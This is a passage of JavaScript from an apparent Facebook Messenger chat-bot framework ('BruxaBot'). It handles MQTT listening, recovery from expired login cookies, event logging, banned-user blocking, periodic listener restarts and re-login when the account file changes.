          JSON.stringify(global.BruxaBot.config, null, 2),
        );
        writeFileSync(
          global.client.dirConfigCommands,
          JSON.stringify(global.BruxaBot.configCommands, null, 2),
        );
        // ── MQTT listen ────────
        const { restartListenMqtt } = global.BruxaBot.config;
        let intervalCheckLiveCookieAndRelogin = false;

        async function callBackListen(error, event) {
          // ── Handle MQTT errors ──────────
          if (error) {
            global.responseUptimeCurrent = responseUptimeError;

            const notLoggedIn = [
              "Not logged in",
              "Not logged in.",
              "Connection refused: Server unavailable",
            ].includes(error.error);

            if (notLoggedIn) {
              log.err("NOT LOGGED IN", getText("login", "notLoggedIn"), error);
              global.statusAccountBot = "can't login";

              if (!isSendNotiErrorMessage) {
                await handlerWhenListenHasError({
                  api,
                  threadModel,
                  userModel,
                  dashBoardModel,
                  globalModel,
                  threadsData,
                  usersData,
                  dashBoardData,
                  globalData,
                  error,
                });
                isSendNotiErrorMessage = true;
              }

              // Hard restart if configured
              if (global.BruxaBot.config.autoRestartWhenListenMqttError) {
                process.exit(2);
                return;
              }

              // stop listener and poll until cookie is live again
              const keyListen = Object.keys(callbackListenTime).pop();
              if (callbackListenTime[keyListen])
                callbackListenTime[keyListen] = () => {};

              const cookieStr = appState
                .map((i) => `${i.key}=${i.value}`)
                .join("; ");
              let times = 5;
              const spinRetry = createOraDots(
                getText("login", "retryCheckLiveCookie", times),
              );
              const countTimes = setInterval(() => {
                times = times === 1 ? 5 : times - 1;
                spinRetry.text = getText(
                  "login",
                  "retryCheckLiveCookie",
                  times,
                );
              }, 1000);

              if (!intervalCheckLiveCookieAndRelogin) {
                intervalCheckLiveCookieAndRelogin = true;
                const interval = setInterval(async () => {
                  const live = await checkLiveCookie(
                    cookieStr,
                    facebookAccountConfig.userAgent,
                  );
                  if (live) {
                    clearInterval(interval);
                    clearInterval(countTimes);
                    intervalCheckLiveCookieAndRelogin = false;
                    isSendNotiErrorMessage = false;
                    spinRetry.stop?.();
                    log.info(
                      "LISTEN_MQTT",
                      "Cookie is live again — resuming listener..",
                    );
                    global.BruxaBot.Listening = api.listenMqtt(
                      createCallBackListen(),
                    );
                  }
                }, 5000);
              }
              return;
            }

            if (
              error === "Connection closed." ||
              error === "Connection closed by user."
            )
              return;

            // Any other MQTT error
            await handlerWhenListenHasError({
              api,
              threadModel,
              userModel,
              dashBoardModel,
              globalModel,
              threadsData,
              usersData,
              dashBoardData,
              globalData,
              error,
            });
            return log.err(
              "LISTEN_MQTT",
              getText("login", "callBackError"),
              error,
            );
          }

          // ── Handle events ───────
          global.responseUptimeCurrent = responseUptimeSuccess;
          global.statusAccountBot = "good";
          if (isSendNotiErrorMessage) isSendNotiErrorMessage = false;

          if (event.messageID && event.type === "message") {
            if (storage5Message.includes(event.messageID)) {
              Object.keys(callbackListenTime)
                .slice(0, -1)
                .forEach((k) => {
                  callbackListenTime[k] = () => {};
                });
            } else {
              storage5Message.push(event.messageID);
            }
            if (storage5Message.length > 5) storage5Message.shift();
          }

          // Log event
          const configLog = global.BruxaBot.config?.logEvents;
          if (
            configLog?.disableAll === false &&
            configLog[event.type] !== false
          ) {
            const pids = [...(event.participantIDs || [])];
            if (event.participantIDs)
              event.participantIDs = `Array(${event.participantIDs.length})`;
            console.log(
              colors.green((event.type || "").toUpperCase() + ":"),
              jsonStringifyColor(event, null, 2),
            );
            if (event.participantIDs) event.participantIDs = pids;
          }

          // Block banned users
          if (
            (event.senderID && dataGban[event.senderID]) ||
            (event.userID && dataGban[event.userID])
          ) {
            if (
              event.body &&
              event.threadID &&
              event.body.startsWith(getPrefix(event.threadID))
            )
              return api.sendMessage(
                getText("login", "userBanned"),
                event.threadID,
              );
            return;
          }

          // Route to handler
          const handlerAction = require("../handler/handlerAction.js")(
            api,
            threadModel,
            userModel,
            dashBoardModel,
            globalModel,
            usersData,
            threadsData,
            dashBoardData,
            globalData,
          );
          hasBanned === false
            ? handlerAction(event)
            : log.err("GBAN", getText("login", "youAreBanned"));
        }

        function createCallBackListen(key) {
          key = randomString(10) + (key || Date.now());
          callbackListenTime[key] = callBackListen;
          return (error, event) => callbackListenTime[key](error, event);
        }

        await stopListening();
        global.BruxaBot.Listening = api.listenMqtt(createCallBackListen());
        global.BruxaBot.callBackListen = callBackListen;

        // ── MQTT periodic restart ──────
        if (restartListenMqtt?.enable) {
          if (restartListenMqtt.logNoti) {
            log.info(
              "LISTEN_MQTT",
              getText(
                "login",
                "restartListenMessage",
                convertTime(restartListenMqtt.timeRestart, true),
              ),
            );
            log.info("BOT_STARTED", getText("login", "startBotSuccess"));
            logColor("#f5ab00", character);
          }
          global.intervalRestartListenMqtt = setInterval(async () => {
            if (!restartListenMqtt.enable) {
              clearInterval(global.intervalRestartListenMqtt);
              return;
            }
            try {
              await stopListening();
              await sleep(restartListenMqtt.delayAfterStopListening || 2000);
              global.BruxaBot.Listening = api.listenMqtt(
                createCallBackListen(),
              );
              log.info(
                "LISTEN_MQTT",
                getText("login", "restartListenMessage2"),
              );
            } catch (e) {
              log.err(
                "LISTEN_MQTT",
                getText("login", "restartListenMessageError"),
                e,
              );
            }
          }, restartListenMqtt.timeRestart);
        }

        require("../autoUptime.js");
      },
    );
  })(appState);

  if (global.BruxaBot.config.autoReloginWhenChangeAccount) {
    setTimeout(() => {
      watch(dirAccount, async (type) => {
        if (
          type === "change" &&
          !changeFbStateByCode &&
          latestChangeContentAccount !== fs.statSync(dirAccount).mtimeMs
        ) {
          clearInterval(global.intervalRestartListenMqtt);
          latestChangeContentAccount = fs.statSync(dirAccount).mtimeMs;
          startBot();
        }
      });
    }, 10000);
  }
}

global.BruxaBot.reLoginBot = startBot;
startBot();
